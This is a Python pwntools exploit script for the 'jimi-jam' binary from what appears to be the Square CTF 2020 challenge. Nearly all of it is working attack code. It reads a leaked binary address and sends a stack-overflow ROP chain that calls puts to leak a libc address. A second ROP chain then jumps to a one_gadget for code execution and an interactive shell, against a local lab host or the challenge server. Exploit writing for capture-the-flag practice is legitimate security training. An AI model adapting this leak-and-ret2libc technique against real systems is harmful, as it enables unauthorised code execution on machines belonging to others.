#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys

from pwn import *

context.log_level = 'info'

BINARY = "./jimi-jam"
LIB = "./libc.so.6"
HOST = 'challenges.2020.squarectf.com'
PORT = 9000

GDB_COMMANDS = ['b main']


def get_ropchain_leak():
    """Returns the ropchain for leaking a libc address (puts)."""
    ropchain = [
        context.binary.address + 0x13a3,  # pop rdi; ret;
        context.binary.sym['puts'],
        context.binary.address + 0x10b0,  # call puts
        context.binary.sym['vuln']
    ]
    return b''.join(map(p64, ropchain))


def get_ropchain_rce(libc):
    """Returns the ropchain for RCE."""
    ropchain = [
        libc.address + 0x162866,  # pop rdx; pop rbx; ret;
        0,
        0,
        libc.address + 0x27529,  # pop rsi; ret;
        0,
        libc.address + 0xe6e79,  # one_gadget
    ]
    return b''.join(map(p64, ropchain))


def exploit(p, mode, libc):
    """Exploit goes here."""
    p.recvuntil('here! ')
    binary_leak = p.recvuntil('\n', drop=True)
    context.binary.address = int(binary_leak, 16) - context.binary.sym['ROPJAIL']
    log.info(f'Binary @ address 0x{context.binary.address:x}')

    p.recvuntil('JAIL\n')

    log.info('Sending first ropchain (leak libc address)')
    payload = b'A'*16
    payload += get_ropchain_leak()
    p.sendline(payload)

    libc_leak = p.recvuntil('\n', drop=True)
    libc.address = u64(libc_leak.ljust(8, b'\0')) - libc.sym['puts']
    log.info(f'Libc @ address 0x{libc.address:x}')

    log.info('Sending second ropchain (RCE)')
    payload = p64(context.binary.sym['ROPJAIL'] + 0x100)*2  # Set rbp
    payload += get_ropchain_rce(libc)
    p.sendline(payload)

    p.recvuntil('JAIL\n')

    p.interactive()


def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mode>")
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f"Failed to load binary ({BINARY})")

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ.copy()
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f"Failed to load library ({LIB})")

    mode = sys.argv[1]

    if mode == "local":
        p = remote("pwn.local", 2222)
    elif mode == "debug":
        p = remote("pwn.local", 2223)
        gdb_cmd = ['tmux',
                   'split-window',
                   '-p',
                   '75',
                   'gdb',
                   '-ex',
                   'target remote pwn.local:2224',
                   ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append("-ex")
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == "remote":
        p = remote(HOST, PORT)
    else:
        print("Invalid mode")
        sys.exit(1)

    exploit(p, mode, libc)

if __name__ == "__main__":

    main()
